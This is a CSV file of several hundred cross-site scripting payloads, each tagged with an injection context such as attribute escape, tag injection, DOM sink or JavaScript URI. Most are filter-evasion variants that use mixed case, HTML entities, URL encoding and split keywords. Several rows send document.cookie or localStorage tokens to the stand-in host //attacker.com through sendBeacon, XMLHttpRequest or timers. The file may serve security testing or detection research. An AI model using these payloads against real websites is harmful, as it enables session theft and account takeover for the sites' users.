payload,context
&quot; onmouseenter=\u0061lert(document.domain) x=&quot;,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.cOokIe)>"")",dom_sink
' %3E%3Csvg onended=alert(1)%3E,attribute_escape
&quot; onclick=prompt(%27XSS%27) x=&quot;,attribute_escape
"' ><svg on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<!--><Tr OnaNimAtiOneNd=ProMpt('XSS')>,tag_injection
%3Cblink onkeypress=prompt(document.domain)%3E,tag_injection
#alert(document.domain),template_injection
eval(%22XMLHttpRequest(document.domain)%22),dom_sink
"\%22 onpromptaction=confirm(String.fromCharCode(88,83,83))//",attribute_escape
`><img src=x onp&#97;g&#101;hid&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
onauxclick=prompt(%27XSS%27),event_handler
<title/onstalled=alert(%27XSS%27)>,tag_injection
\%27 onerror=console.log(document.domain)//,attribute_escape
"&#101;v&#97;l(""&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"")",dom_sink
&quOt; onErrOr=ConSolE.lOg(DocUmeNt.DomAin) x=&qUot;,attribute_escape
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
%3Clisting	onpointerrawupdate=alert('XSS')%3E,tag_injection
onmouseenter=alert('XSS'),event_handler
{{ AleRt('XSS') }},template_injection
"\"" onpagehide=confirm(1)//",attribute_escape
"ongotpointercapture=alert(String.fromCharCode(88,83,83))",event_handler
"""><Img srC=x onLoaD=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"""><Img srC=x onHasHchAngE=cOnfIrm(doCumEnt.doMaiN)>",attribute_escape
<listing onkeyup=\u0061lert(location.hash)>,tag_injection
javascript:void(\u0061lert(document.domain)),js_uri
" ongotpointercapture=\u0061lert(String.fromCharCode(88,83,83))",event_handler
"""><t&#97;bl&#101; ons&#101;l&#101;ct=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
<script>Function(%27confirm(1)%27)();</script>,script_injection
"' oNanImaTioNenD=aLerT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
onscrollsn&#97;pch&#97;ng&#101;=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"&quot; oncut=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
""" ><svg onerror=console.log(location.hash)>",attribute_escape
<select/onanimationstart=prompt('XSS')>,tag_injection
\' onfocus=prompt(location.hash)//,attribute_escape
%27 onbeforepaste=console.log(%27XSS%27) %27,attribute_escape
<diAloG	oNpaGehIde=coNsoLe.Log(1)>,tag_injection
<blInk onKeyPreSs=ProMpt(doCumEnt.doMaiN) OnkEypResS=pRomPt(DocUmeNt.DomAin)>,tag_injection
"&quOt; onEndEd=AleRt(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape
\%22 onwebkitanimationend=console.log(document.domain)//,attribute_escape
"%3Cxmp onfocusout=prompt(String.fromCharCode(88,83,83)) onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
oninput=prompt/*x*/('XSS'),event_handler
<script x=y onkeydown=confirm(document.domain)>,tag_injection
"data:text/html,%3Cscript%3Eprompt(1)%3C/script%3E",js_uri
%3Cbutton onclick=console.log(1)/%3E,tag_injection
'%3E%3Cscript%3Eprompt(1)%3C/script%3E,script_injection
`><Img srC=x onPoiNteRmoVe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape
" ondrop=confirm(String.fromCharCode(88,83,83))",event_handler
""" onmouseover=console.log('XSS') """,attribute_escape
<script src=x onclick=prompt('XSS')>,tag_injection
%22><img src=x ontransitionend=alert(1)>,attribute_escape
<base/onkeydown=alert(%27XSS%27)>,tag_injection
"java
script:\u0061lert(String.fromCharCode(88,83,83))",js_uri
"ObjEct.asSigN(wIndOw,{""oNmoUseUp"":coNfiRm})",dom_sink
""" oNmoUseOveR=cOnfIrm('XSS') x=""",attribute_escape
"\"" ontoggl&#101;=consol&#101;.log('XSS')//",attribute_escape
"""%3E%3Cimg src=x onended=console.log(1)%3E",attribute_escape
"`><img src=x oncopy=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
\' onmous&#101;down=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape
<!--><td onwebkitanimationend=prompt(%27XSS%27)>,tag_injection
	onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1),event_handler
OnlOad=coNfiRm(DocUmeNt.DomAin),event_handler
ondr&#97;gov&#101;r=confirm/***/(1),event_handler
"\' ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"__proto__[""ondragenter""]=fetch(document.domain)",dom_sink
""" %3E%3Csvg onbeforetoggle=confirm(location.hash)%3E",attribute_escape
"""><Img srC=x onBefOreTogGle=alErt(loCatIon.haSh)>",attribute_escape
<set onend=alert(1)>,tag_injection
"%22 ><svg onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"oncontextmenu=prompt/*x*/(String.fromCharCode(88,83,83))",event_handler
\' onpageswap=\u0061lert(document.domain)//,attribute_escape
' %3E%3Csvg onwheel=console.log(document.domain)%3E,attribute_escape
'><img src=x onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
`><img src=x on&#101;nd&#101;d=&#97;l&#101;rt('XSS')>,attribute_escape
&quot; onb&#101;gin=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
\' onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape
"""><img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
`><img src=x oncopy=prompt(document.domain)>,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=fEtcH(dOcuMenT.dOmaIn)>"")",dom_sink
"<maTh
OnsCroLleNd=ProMpt(doCumEnt.doMaiN)>",tag_injection
%22 ><svg onpagereveal=prompt(location.hash)>,attribute_escape
"<taBle
onTouCheNd=ProMpt(doCumEnt.doMaiN)>",tag_injection
""" ><svg onprompt&#97;ction=prompt(1)>",attribute_escape
"\"" OngOtpOinTerCapTurE=pRomPt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
"""><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
'><img src=x onfocusin=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
<!--><SelEct onMouSewHeeL=aLerT(dOcuMenT.dOmaIn)>,tag_injection
"<ifRamE oNgeStuReeNd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
' ontouchmove=prompt('XSS') ',attribute_escape
"""><di&#97;log onst&#97;ll&#101;d=confirm('XSS')>",tag_injection
<object	onsubmit=confirm(location.hash)>,tag_injection
' onplay=confirm(document.domain) ',attribute_escape
j&#97;v&#97;script:void(&#97;l&#101;rt(1)),js_uri
"""><TemPlaTe OnrEseT=aLerT(lOcaTioN.hAsh)>",tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=prompt(loc&#97;tion.h&#97;sh)>""",dom_sink
<foRm	OnwEbkItaNimAtiOneNd=ProMpt('XSS')>,tag_injection
onend=prompt/*x*/(location.hash),event_handler
"' onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
`><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
&quot; ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(1) x=&quot;,attribute_escape
%22 onclose=alert(document.domain) %22,attribute_escape
"\' onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
<% AleRt(DocUmeNt.DomAin) %>,template_injection
"location.href=""javascr	ipt:eval(1)""",dom_sink
""" oNpoIntEruP=aLerT(1) """,attribute_escape
"__proto__[%22onkeyup%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
`><img src=x onb&#101;for&#101;toggl&#101;=consol&#101;.log('XSS')>,attribute_escape
"Object.assign(window,{%22onwebkitfullscreenchange%22:prompt})",dom_sink
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""coNfiRm(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))""",dom_sink
""" oNmoZfuLlsCreEncHanGe=AleRt(1) """,attribute_escape
on&#97;nim&#97;tion&#101;nd=prompt/**/(1),event_handler
"\"" onpointerdown=console.log(String.fromCharCode(88,83,83))//",attribute_escape
<liStiNg X=y onTraNsiTioNstArt=coNfiRm(DocUmeNt.DomAin)>,tag_injection
onmouseenter=javascript:\u0061lert(1),event_handler
' ><svg onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
&quot; onbeforeinput=console.log(document.domain) x=&quot;,attribute_escape
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""coNsoLe.Log(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)""",dom_sink
onb&#101;gin=j&#97;v&#97;script:consol&#101;.log('XSS'),event_handler
"__proto__[""onw&#101;bkittr&#97;nsition&#101;nd""]=&#97;l&#101;rt(1)",dom_sink
"Object.assign(window,{""ontouchmove"":eval})",dom_sink
 on&#97;nim&#97;tion&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=prompt(1)>",attribute_escape
<&#97;nim&#97;t&#101;motion x=y ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
onkeypress=javascript:console.log(location.hash),event_handler
\%22 ongestureend=confirm(%27XSS%27)//,attribute_escape
<dialog	onstalled=confirm('XSS')>,tag_injection
"j&#97;v&#97;script:%0&#97;&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
"<mtExt
onMouSedOwn=coNsoLe.Log(1)>",tag_injection
"\"" onpageswap=\u0061lert(document.domain)//",attribute_escape
"__pRotO__[""oNplAyiNg""]=fEtcH(STriNg.FroMChArCOde(88,83,83))",dom_sink
<baSe	OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection
 onpagehide=confirm(location.hash),event_handler
' ><svg onmousewheel=console.log(1)>,attribute_escape
document.body.innerHTML=%22<img src=x onerror=fetch(location.hash)>%22,dom_sink
\%22 onpointercancel=prompt(1)//,attribute_escape
"__proto__[%22onended%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"setInterval(""fetch(localStorage.getItem('token'))"",100)",dom_sink
&quot; onended=alert(1) x=&quot;,attribute_escape
"""><img src=x onfocus=&#97;l&#101;rt(1)>",attribute_escape
"""><Tr OntRanSitIonEnd=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<td src=x onstalled=confirm(%27XSS%27)>,tag_injection
<m&#97;th onmous&#101;up=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
%22><img src=x onfocus=console.log(location.hash)>,attribute_escape
'><img src=x ontouchst&#97;rt=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
""" %3E%3Csvg onpopstate=prompt(1)%3E",attribute_escape
"document.write(""%3Cimg src=x onerror=XMLHttpRequest(localStorage.getItem('token'))%3E"")",dom_sink
"__proto__[""onbeforecut""]=\u0061lert(localStorage.getItem('token'))",dom_sink
' ><svG oNplAyiNg=AleRt(LocAtiOn.HasH)>,attribute_escape
<!--><table oncopy=confirm(%27XSS%27)>,tag_injection
""" ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
' %3E%3Csvg onbeforeinput=console.log('XSS')%3E,attribute_escape
%27 ><svg onwebkitfullscreenchange=prompt(%27XSS%27)>,attribute_escape
<baSe OnbEfoRecOpy=coNsoLe.Log(loCatIon.haSh)/>,tag_injection
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(docum&#101;nt.dom&#97;in),event_handler
%22><img src=x onpointerrawupdate=prompt(%27XSS%27)>,attribute_escape
<td onmozfullscreenchange=console.log(location.hash)>,tag_injection
"' oNclOse=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
<liNk	OndRop=prOmpT(dOcuMenT.dOmaIn)>,tag_injection
\%22 oninvalid=alert(document.domain)//,attribute_escape
"(n&#101;w Function(""&#101;v&#97;l(1)""))();",dom_sink
"""><Img srC=x onMouSewHeeL=pRomPt('XSS')>",attribute_escape
"document.querySelector(""body"").innerHTML+=""confirm(1)""",dom_sink
<!--><ForM oNwaItiNg=ConFirM(1)>,tag_injection
onscrollend=prompt/**/(1),event_handler
"window[""XMLHttpR&#101;qu&#101;st""](bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
%3Ciframe oninput=console.log(location.hash)/%3E,tag_injection
&quot; onpause=console.log(%27XSS%27) x=&quot;,attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#101;v&#97;l(loc&#97;tion.h&#97;sh)""",dom_sink
<xsS oNkeYprEss=coNsoLe.Log(1) onKeyPreSs=ConSolE.lOg(1)>,tag_injection
%27><img src=x oncut=alert(%27XSS%27)>,attribute_escape
"__pRotO__[""oNmoUseOveR""]=feTch(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
' ><svg onpromptdismiss=prompt(1)>,attribute_escape
"' ><svg onend=confirm(String.fromCharCode(88,83,83))>",attribute_escape
\' ondragstart=confirm(1)//,attribute_escape
%3Cembed src=x onmouseenter=confirm('XSS')%3E,tag_injection
	onmozfullscreenchange=prompt(1),event_handler
"SetTimEouT(""EvaL(STriNg.FroMChArCOde(88,83,83))"",0)",dom_sink
onblur=javascr	ipt:alert(document.domain),event_handler
"' ><svg ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"' onpl&#97;y=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""%3E%3Cimg src=x oninvalid=confirm(1)%3E",attribute_escape
"""><&#97;nim&#97;t&#101;tr&#97;nsform ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" %3E%3Csvg onscrollsnapchange=console.log(location.hash)%3E",attribute_escape
<math x=y ondragover=prompt(1)>,tag_injection
<di&#97;log on&#101;nd&#101;d=consol&#101;.log(1) on&#101;nd&#101;d=consol&#101;.log(1)>,tag_injection
"\' onfocusout=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"setTimeout(%22console.log(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,0)",dom_sink
"OngEstUreEnd=coNfiRm/**/(StRinG.fRomChaRCoDe(88,83,83))",event_handler
<td src=x onsubmit=confirm(document.domain)>,tag_injection
""" ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
""" onp&#97;us&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
%22><animatetransform onpointerdown=prompt(1)>,tag_injection
<!--><di&#97;log on&#101;nd&#101;d=consol&#101;.log(1)>,tag_injection
"""><img src=x onplay=confirm(1)>",attribute_escape
<animatemotion	onanimationiteration=console.log('XSS')>,tag_injection
' ><svG oNwhEel=coNsoLe.Log(loCatIon.haSh)>,attribute_escape
"j&#97;v&#97;
script:consol&#101;.log(loc&#97;tion.h&#97;sh)",js_uri
"\"" onscrollsnapchange=confirm('XSS')//",attribute_escape
"&#106;avascript:alert(String.fromCharCode(88,83,83))",js_uri
"\' onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
\' ongestureend=confirm(location.hash)//,attribute_escape
%3C!--%3E%3Cset onpointermove=confirm(location.hash)%3E,tag_injection
${confirm(docum&#101;nt.cooki&#101;)},template_injection
"OnpOinTerCanCel=alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"%22 ongotpointercapture=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
"s&#101;tTim&#101;out(""confirm('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink
""" %3E%3Csvg ongesturestart=alert(location.hash)%3E",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;r&#101;v&#101;&#97;l"":XMLHttpR&#101;qu&#101;st})",dom_sink
`><Img srC=x onPopStaTe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape
"document.write(""%3Cimg src=x onerror=eval(btoa(document.cookie))%3E"")",dom_sink
""" ><svg onsearch=\u0061lert(1)>",attribute_escape
onload=confirm(document.domain),event_handler
"`%3E%3Cimg src=x onpageswap=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
\%22 onpromptdismiss=console.log(%27XSS%27)//,attribute_escape
%3Cimg onpageswap=console.log(1)%3E,tag_injection
"__proto__[""onmousedown""]=\u0061lert(document.cookie+'&loc='+location.href)",dom_sink
javascr	ipt:void(prompt('XSS')),js_uri
JavAscRipT:%0acOnfIrm(loCatIon.haSh),js_uri
<arEa	OncLosE=pRomPt(1)>,tag_injection
%3Csvg x=y onbeforecopy=prompt(document.domain)%3E,tag_injection
"Object.assign(window,{""onbeforetoggle"":eval})",dom_sink
OnwAitIng=coNfiRm&#40;doCumEnt.doMaiN&#41;,event_handler
`%3E%3Cimg src=x onpopstate=alert(1)%3E,attribute_escape
"data:text/html,%3Cscript%3Ealert(location.hash)%3C/script%3E",js_uri
"&quot; onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"<boDy	OnfOcuSouT=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"__proto__[""onlo&#97;d""]=&#101;v&#97;l(loc&#97;tion.h&#97;sh)",dom_sink
\%22 ondblclick=console.log(location.hash)//,attribute_escape
{{constructor['constructor']('prompt('XSS')')()}},template_injection
\%22 onended=console.log(1)//,attribute_escape
(new Function(%22eval(%27XSS%27)%22))();,dom_sink
%3Cselect onvolumechange=console.log(1)%3E,tag_injection
"window[""&#97;l&#101;rt""](n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
<obj&#101;ct/ontouchst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cmath	oninvalid=confirm('XSS')%3E,tag_injection
"\' OnpRomPtdIsmIss=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
"element.setAttribute(%22onclick%22,%22XMLHttpRequest(%27//attacker.com/?c=%27+document.cookie)%22)",dom_sink
<sp&#97;n/onb&#101;for&#101;toggl&#101;=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"""><img src=x ontouchend=console.log('XSS')>",attribute_escape
"\%22 onpageswap=console.log(String.fromCharCode(88,83,83))//",attribute_escape
onpointermove=confirm(%27XSS%27),event_handler
"`><Img srC=x onAniMatIonCanCel=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"setInterval(""eval(document.cookie+'&loc='+location.href)"",100)",dom_sink
"' onpromptdismiss=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
"""><BasE oNpoIntEruP=aLerT(lOcaTioN.hAsh)>",tag_injection
"<p onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img src=x ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tionc&#97;nc&#101;l"":XMLHttpR&#101;qu&#101;st})",dom_sink
%27 ><svg onmousewheel=alert(location.hash)>,attribute_escape
""" oNpaGehIde=coNfiRm(1) """,attribute_escape
"onclose=javascript:\u0061lert(String.fromCharCode(88,83,83))",event_handler
%3Canimatemotion src=x ongesturestart=confirm(1)%3E,tag_injection
"\"" OncOntExtMenU=aLerT(dOcuMenT.dOmaIn)//",attribute_escape
%27><img src=x ongotpointercapture=console.log(%27XSS%27)>,attribute_escape
"""><tr onselect=console.log(1)>",tag_injection
"""%3E%3Cimg src=x onsearch=prompt(location.hash)%3E",attribute_escape
<blink	onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"__proto__[""onblur""]=prompt(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
<area onpointercancel=console.log(document.domain)/>,tag_injection
"""><meta ondrop=alert(document.domain)>",tag_injection
"&#101;v&#97;l(""&#101;v&#97;l(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
"<ifRamE/oNtoUchStaRt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<imAge srC=x onChaNge=alErt(1)>,tag_injection
<scr	ipt>/x/confirm(location.hash)</scr	ipt>,script_injection
"ObjEct.asSigN(wIndOw,{""oNbeForEcuT"":ConSolE.lOg})",dom_sink
""" ><svg onkeydown=alert(location.hash)>",attribute_escape
"' ><svg onrepeat=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"__proto__[""oninvalid""]=XMLHttpRequest(btoa(document.cookie))",dom_sink
"Object.assign(window,{""onbegin"":eval})",dom_sink
&quot; onscrollend=prompt(location.hash) x=&quot;,attribute_escape
 onmozfullscreenchange=prompt('XSS'),event_handler
"""><img src=x onpromptdismiss=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
' oNclOse=coNsoLe.Log(loCatIon.haSh) ',attribute_escape
' ><svg onpromptdismiss=prompt(document.domain)>,attribute_escape
' ><svG oNgeStuResTarT=pRomPt('XSS')>,attribute_escape
\' OnhAshChaNge=coNfiRm(DocUmeNt.DomAin)//,attribute_escape
"java
script:prompt(document.domain)",js_uri
"<xmP oNtoUchEnd=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
 oncanplay=console.log(%27XSS%27),event_handler
<m&#101;t&#97;	ons&#101;curitypolicyviol&#97;tion=prompt('XSS')>,tag_injection
%27 onsearch=confirm(1) %27,attribute_escape
"setInterval(%22alert(%27//attacker.com/?c=%27+document.cookie)%22,100)",dom_sink
 oninput=&#97;l&#101;rt(1),event_handler
onsubmit=alert(location.hash),event_handler
%3Cobject onvolumechange=alert(1) onvolumechange=alert(1)%3E,tag_injection
"' ><svG oNtrAnsItiOnrUn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
<meta onsecuritypolicyviolation=prompt('XSS')>,tag_injection
"""><NosCriPt OnbEfoRemAtcH=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
\' onb&#101;for&#101;cut=consol&#101;.log(1)//,attribute_escape
"\"" onmozfullscreenchange=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape
